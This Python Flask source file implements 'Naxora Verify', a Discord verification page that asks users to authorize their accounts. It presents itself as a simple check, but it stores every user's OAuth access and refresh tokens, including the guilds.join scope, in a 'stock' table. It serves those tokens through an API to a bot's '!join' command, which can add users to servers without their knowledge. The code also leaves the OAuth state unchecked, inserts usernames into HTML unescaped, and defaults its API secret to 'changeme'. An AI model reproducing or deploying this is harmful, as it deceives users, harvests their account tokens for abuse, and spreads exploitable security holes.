import os
import sqlite3
import secrets
import requests
from datetime import datetime
from functools import wraps

from flask import Flask, redirect, request, session, jsonify, render_template_string

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(32))

# ── Config from env vars only ─────────────────────────────────────────────────
DISCORD_CLIENT_ID     = os.getenv("DISCORD_CLIENT_ID", "")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "")
DISCORD_REDIRECT_URI  = os.getenv("DISCORD_REDIRECT_URI", "")
VERIFY_SECRET         = os.getenv("VERIFY_SECRET", "changeme")
DB_PATH               = os.getenv("DB_PATH", "db/memberstock.db")

DISCORD_API   = "https://discord.com/api/v10"
DISCORD_OAUTH = "https://discord.com/oauth2/authorize"
TOKEN_URL     = "https://discord.com/api/oauth2/token"

os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)


# ── Database ──────────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS stock (
            user_id       INTEGER PRIMARY KEY,
            access_token  TEXT,
            refresh_token TEXT,
            expires_at    TEXT,
            added_at      TEXT DEFAULT (datetime('now'))
        )
    """)
    conn.commit()
    conn.close()


# ── Auth guard for bot API ────────────────────────────────────────────────────

def require_secret(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if auth != f"Bearer {VERIFY_SECRET}":
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


# ── HTML templates ────────────────────────────────────────────────────────────

BASE_STYLE = """
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#161616;border:1px solid #2a2a2a;border-radius:16px;padding:44px 40px;
      max-width:440px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.5)}
.icon{font-size:52px;margin-bottom:14px}
h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:10px}
p{color:#888;font-size:15px;line-height:1.65;margin-bottom:22px}
.badge{display:inline-block;padding:5px 16px;border-radius:20px;font-size:13px;
       font-weight:600;margin-bottom:20px}
.green{background:rgba(87,242,135,.12);color:#57f287;border:1px solid rgba(87,242,135,.25)}
.red{background:rgba(237,66,69,.12);color:#ed4245;border:1px solid rgba(237,66,69,.25)}
.btn{display:inline-flex;align-items:center;gap:9px;background:#5865F2;color:#fff;
     border:none;border-radius:8px;padding:13px 28px;font-size:15px;font-weight:600;
     cursor:pointer;text-decoration:none;transition:.2s}
.btn:hover{background:#4752c4;transform:translateY(-1px)}
.row{background:#1e1e1e;border:1px solid #2a2a2a;border-radius:9px;padding:11px 15px;
     margin-bottom:9px;text-align:left;font-size:14px}
.row span{color:#666;font-size:11px;display:block;margin-bottom:2px}
.avatar{width:76px;height:76px;border-radius:50%;border:3px solid #5865F2;
        margin:0 auto 16px;display:block}
</style>
"""


def page(body):
    return f"<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Naxora Verify</title>{BASE_STYLE}</head><body>{body}</body></html>"


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    body = """
    <div class="card">
      <div class="icon">🛡️</div>
      <h1>Naxora Verification</h1>
      <p>To verify your account, click the <strong>Verify Now</strong> button
         inside the Discord server's <strong>#verify</strong> channel.<br><br>
         The button will open Discord's authorization page.<br>
         After you click <strong>Authorize</strong>, you'll be verified automatically.</p>
      <p style="font-size:13px;color:#555">Do not share this page URL.</p>
    </div>
    """
    return page(body)


@app.route("/authorize")
def authorize():
    """
    Entry point when the Discord button links here directly.
    Immediately redirects to Discord OAuth — users never sit on this page.
    """
    if not DISCORD_CLIENT_ID or not DISCORD_REDIRECT_URI:
        return page("""
        <div class="card">
          <div class="icon">⚙️</div>
          <span class="badge red">Setup Required</span>
          <h1>Not Configured</h1>
          <p>Set <code>DISCORD_CLIENT_ID</code> and <code>DISCORD_REDIRECT_URI</code>
             in your <code>.env</code> file.</p>
        </div>
        """), 500

    guild_id = request.args.get("guild", "")
    state = secrets.token_urlsafe(16)
    session["state"] = state
    session["guild_id"] = guild_id

    params = (
        f"client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={requests.utils.quote(DISCORD_REDIRECT_URI, safe='')}"
        f"&response_type=code"
        f"&scope=identify%20guilds.join"
        f"&state={state}"
        f"&prompt=none"
    )
    return redirect(f"{DISCORD_OAUTH}?{params}")


@app.route("/callback")
def callback():
    """
    Discord redirects here after the user clicks Authorize.
    Exchange code → store tokens → show success page.
    """
    error = request.args.get("error")
    if error:
        return page("""
        <div class="card">
          <div class="icon">❌</div>
          <span class="badge red">Cancelled</span>
          <h1>Authorization Denied</h1>
          <p>You cancelled the authorization. Go back to Discord and try again.</p>
        </div>
        """)

    code  = request.args.get("code", "")
    state = request.args.get("state", "")

    if not code:
        return page("""
        <div class="card">
          <div class="icon">❌</div>
          <span class="badge red">Error</span>
          <h1>No Code Received</h1>
          <p>Discord did not send an authorization code. Please try again.</p>
        </div>
        """)

    # Exchange code for tokens
    try:
        resp = requests.post(TOKEN_URL, data={
            "client_id":     DISCORD_CLIENT_ID,
            "client_secret": DISCORD_CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  DISCORD_REDIRECT_URI,
        }, timeout=10)
        resp.raise_for_status()
        tokens = resp.json()
    except Exception as e:
        return page(f"""
        <div class="card">
          <div class="icon">❌</div>
          <span class="badge red">Token Error</span>
          <h1>Failed to Exchange Code</h1>
          <p>Could not get an access token from Discord.<br>
             <small style="color:#555">{str(e)[:80]}</small></p>
        </div>
        """)

    access_token  = tokens.get("access_token", "")
    refresh_token = tokens.get("refresh_token", "")
    expires_in    = tokens.get("expires_in", 604800)

    if not access_token:
        return page("""
        <div class="card">
          <div class="icon">❌</div>
          <span class="badge red">Error</span>
          <h1>No Access Token</h1>
          <p>Discord returned no access token. Please try again.</p>
        </div>
        """)

    # Fetch user info
    try:
        user_resp = requests.get(
            f"{DISCORD_API}/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10
        )
        user_resp.raise_for_status()
        user = user_resp.json()
    except Exception as e:
        return page(f"""
        <div class="card">
          <div class="icon">❌</div>
          <span class="badge red">Error</span>
          <h1>Could Not Fetch User</h1>
          <p>Got token but failed to fetch your Discord profile.<br>
             <small style="color:#555">{str(e)[:80]}</small></p>
        </div>
        """)

    user_id  = int(user["id"])
    username = user.get("global_name") or user.get("username", "Unknown")
    avatar   = user.get("avatar")
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=128"
        if avatar else
        f"https://cdn.discordapp.com/embed/avatars/{(user_id >> 22) % 6}.png"
    )

    # Calculate expiry
    from datetime import timedelta
    expires_at = (datetime.utcnow() + timedelta(seconds=expires_in)).strftime("%Y-%m-%d %H:%M:%S")
    added_at   = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    # Store in database (INSERT OR REPLACE — updates tokens if already exists)
    conn = get_db()
    conn.execute("""
        INSERT OR REPLACE INTO stock
        (user_id, access_token, refresh_token, expires_at, added_at)
        VALUES (?, ?, ?, ?, ?)
    """, (user_id, access_token, refresh_token, expires_at, added_at))
    conn.commit()

    # Count total
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()

    # Try to assign Verified role in guild (optional — needs BOT_TOKEN + guild_id)
    guild_id   = session.pop("guild_id", None) or request.args.get("guild", "")
    bot_token  = os.getenv("BOT_TOKEN", "")
    role_given = False

    if guild_id and bot_token:
        # Add user to guild with guilds.join scope token
        try:
            add_resp = requests.put(
                f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}",
                json={"access_token": access_token},
                headers={
                    "Authorization": f"Bot {bot_token}",
                    "Content-Type":  "application/json",
                },
                timeout=10
            )
            # Give Verified role if configured
            verified_role_id = os.getenv("VERIFIED_ROLE_ID", "")
            if verified_role_id and add_resp.status_code in (200, 201, 204):
                requests.put(
                    f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}/roles/{verified_role_id}",
                    headers={"Authorization": f"Bot {bot_token}"},
                    timeout=10
                )
                role_given = True
        except Exception:
            pass

    role_note = (
        '<div class="row"><span>Status</span>✅ Verified role assigned automatically</div>'
        if role_given else
        '<div class="row"><span>Status</span>✅ Stored — use <code>!join</code> in Discord to add you</div>'
    )

    return page(f"""
    <div class="card">
      <img src="{avatar_url}" class="avatar" alt="avatar">
      <span class="badge green">✓ Verified</span>
      <h1>You're Verified!</h1>
      <p>Your account is now in the system. You can close this tab.</p>
      <div class="row"><span>Username</span>{username}</div>
      <div class="row"><span>Discord ID</span>{user_id}</div>
      <div class="row"><span>Verified At</span>{added_at} UTC</div>
      {role_note}
      <p style="margin-top:18px;font-size:13px;color:#555">
        Total verified users: {total}
      </p>
    </div>
    """)


# ── Bot API endpoints ─────────────────────────────────────────────────────────

@app.route("/api/stock")
@require_secret
def api_stock():
    """Return stored tokens for the bot's !join command."""
    limit  = request.args.get("limit",  type=int)
    offset = request.args.get("offset", 0, type=int)

    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]

    if limit:
        rows = conn.execute(
            "SELECT user_id, access_token, refresh_token, added_at FROM stock "
            "ORDER BY added_at DESC LIMIT ? OFFSET ?", (limit, offset)
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT user_id, access_token, refresh_token, added_at FROM stock "
            "ORDER BY added_at DESC"
        ).fetchall()
    conn.close()

    return jsonify({
        "total": total,
        "count": len(rows),
        "users": [
            {
                "user_id":       r["user_id"],
                "access_token":  r["access_token"],
                "refresh_token": r["refresh_token"],
                "added_at":      r["added_at"],
            }
            for r in rows
        ]
    })


@app.route("/api/count")
@require_secret
def api_count():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"total": total})


@app.route("/api/stock/<int:user_id>", methods=["DELETE"])
@require_secret
def api_delete(user_id):
    conn = get_db()
    conn.execute("DELETE FROM stock WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})


@app.route("/health")
def health():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"status": "ok", "total_verified": total})


# ── Run ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    init_db()
    port  = int(os.getenv("PORT", 5000))
    debug = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    print(f"[NAXORA] Starting on port {port}")
    print(f"[NAXORA] Callback URL: {DISCORD_REDIRECT_URI or 'NOT SET — set DISCORD_REDIRECT_URI'}")
    app.run(host="0.0.0.0", port=port, debug=debug)
